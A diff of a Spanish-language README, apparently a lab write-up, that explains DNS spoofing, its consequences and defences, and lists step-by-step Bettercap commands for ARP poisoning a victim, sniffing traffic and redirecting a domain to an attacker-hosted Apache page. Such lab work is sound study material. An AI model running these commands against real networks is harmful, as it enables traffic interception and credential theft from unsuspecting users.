@@ -4,6 +4,8 @@
 ## 1. Descripción del ataque
 DNS Spoofing, también conocido como DNS Cache Poisoning, es un ciberataque donde se alteran registros DNS para redireccionar a usuarios a páginas web fraudulentas. Este ataque explota vulnerabilidades en el DNS (Domain Name System) para manipular la resolución de los nombres de dominio en direcciones Ips, dirgiendo a los usuarios a sitios maliciosos en vez de los intencionados por el usuario.
 
+----
+
 ## 2. Como funciona DNS Spoofing
 
 Cuando un usuario intenta visitar una web, su dispositivo, ya sea un móvil, portátil u ordenador, envía una petición a un servidor DNS para obtener la dirección IP asociada a ese nombre de dominio. En un ataque de suplantación DNS, un atacante intercepta esta petición y responde con una dirección IP falsa, redireccionando al usuario al sitio malicioso. Esto puede ocurrir de varias formas:
@@ -15,7 +17,7 @@ Cuando un usuario intenta visitar una web, su dispositivo, ya sea un móvil, por
 3. Secuestro Local (Local Hijack): El atacante cambia la configuración DNS en el dispositivo del usuario o en el router para apuntar a un servidor DNS malicioso.
 
 
-
+---- 
 
 ## 3. Consecuencias de DNS Spoofing
 
@@ -28,7 +30,7 @@ Entre las consecuencias incluidas están:
 - Robo de datos: los atacantes pueden interceptar y robar información sensible trasnmitida entre el dispositivo del usuario y páginas fraudulentas
 
 
-
+---- 
 ## 4. Medidas de protección
 
 Para protegerse contra este ataque, se pueden implementar diversas contramedidas:
@@ -41,94 +43,87 @@ Para protegerse contra este ataque, se pueden implementar diversas contramedidas
       
 - Redes Virtuales Privadas (VPN): las VPN encriptan todo el tráfico de internet, proporcionando una capa de seguridad adicional contra el DNS spoofing
 
-
-## 4. Herramientas utilizadas - Bettercap
+---- 
+## 5. Herramientas utilizadas - Bettercap
 
 Bettercap es un poderoso, fácilmente extensible, y framework portable escrito en Go, cuyo objetivo es ofrecer a analistas de seguridad, red teams y reverse engineers una herramienta fácil de usar, todo en uno, con todas las características que posiblemente necesiten para realizar reconocimiento y atacar redes Wifi, dispositivos bluetooth, redes IPv4 e IPv6 entre otros
 
 <img src="https://www.bettercap.org/_astro/logo.9NeNvQAS_Z1OvlVx.webp" width="150px" heigth="auto">
 
-## 5. Protocolos vulnerados
+----
 
+## 6. Protocolos vulnerados
 Los protocolos vulnerados en el DNS Spoofing incluyen el Protocolo de Resolución de Nombres (DNS), que es el sistema que traduce los nombres de dominio en direcciones IP. Los atacantes pueden manipular esta traducción para redirigir el tráfico de los usuarios hacia sitios web maliciosos. Además, el Protocolo de Resolución de Direcciones de Protocolo de Resolución (ARP), que permite a los dispositivos localizar direcciones IP a partir de nombres de dominio, también puede ser utilizado para redirigir el tráfico hacia servidores maliciosos.
 
-## 6. Pasos importantes de la PoC (Prove of Concept) y pasos para su mitigación
-
+---- 
+## 7. Pasos importantes de la PoC (Prove of Concept) y pasos para su mitigación
+---- 
 ### 1. Instalar bettercap
 ```bash
 sudo apt install bettercap
 ```
+---- 
 ### 2. Iniciar bettercap 
 
 ```bash
 sudo bettercap
 ```
+---- 
 ### 3. Iniciar net.probe 
 ```bash
 net.probe on
 ```
+---- 
 ### 4. Iniciar ticker 
 ```bash
 ticker on
 ```
-
-### 5. Asignar la puerta de enlace (gateway) al arp spoofing 
+---- 
+### 5. Asignar la IP de la victima al envenenamiento ARP
 ```bash
-set arp.spoof targets <gatewayIp>
+set arp.spoof targets <IPVictima>
 ```
-
+---- 
 ### 6. Iniciar arp spoofng 
 ```bash
 arp.spoof on
 ```
+---- 
 ### 7. Capturar el trafico de red como si de un wireshark se tratase 
 ```bash
 set net.sniff.verbose false
 ```
-Esto que hemos realizado es para el router, ahora lo haríamos con la máquina victima
-
-### 8. Repetir paso 5 pero con la IP de la victima
 ```bash
-set arp.spoof targets <IP>
+set net.sniff on
 ```
-
-### 9. Iniciar arp spoofng 
-```bash
-arp.spoof on
-```
-
-### 10. Comprobar que el ataque ha funcionado realizando el comando en la victima
+---- 
+### 8. Comprobar que el ataque ha funcionado realizando el comando en la victima
 ```bash
 arp -a
 ```
 Deberíamos de ver que, tanto la puerta de enlace como la IP de la máquina Kali, coinciden
-
-### 11. Configurar servidor apache
+---- 
+### 9. Configurar servidor apache
 ```bash
 apt install apache2
 ```
+---- 
 Usaremos apache para almacenar la web que se alojará en el dominio e IP falsa que proporcionaremos a la víctima
-
-### 12. Asignar valor de dominio a dns spoof
+---- 
+### 10. Asignar valor de dominio a dns spoof
 ```bash
 set dns.spoof.domains <nombreDominio>
 ```
-
-### 13. Redirigir a la victima a nuestra IP atacante
+---- 
+### 11. Redirigir a la victima a nuestra IP atacante
 ```bash
 set dns.spoof.address <IPatacante>
 ```
-### 14. Activar el servicio
+---- 
+### 12. Activar el servicio
 ```bash
 dns.spoof on
 ```
 ---- 
 
-Para adjuntar video arrastrar archivo .mp4 al readme
-
- https://github.com/user-attachments/assets/04ebb71f-a603-4e30-9f40-f156ebceabf3
-
-
-
-
-
+https://github.com/user-attachments/assets/e32adbfc-eac0-4319-9ae4-3de36f6d18bd
